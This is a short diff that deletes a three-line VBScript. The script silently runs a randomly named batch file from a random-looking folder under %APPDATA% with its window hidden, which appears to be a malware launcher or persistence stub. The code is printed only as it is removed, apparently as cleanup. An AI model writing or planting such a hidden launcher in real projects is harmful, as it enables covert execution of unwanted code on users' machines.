@@ -1,3 +1,0 @@
-set wshShell = WScript.CreateObject("WScript.Shell")
-appData = wshShell.expandEnvironmentStrings("%APPDATA%")
-wshShell.Run chr(34) & appData + "\6gA8rr4a\LP2ADRR5.bat" & chr(34), 0
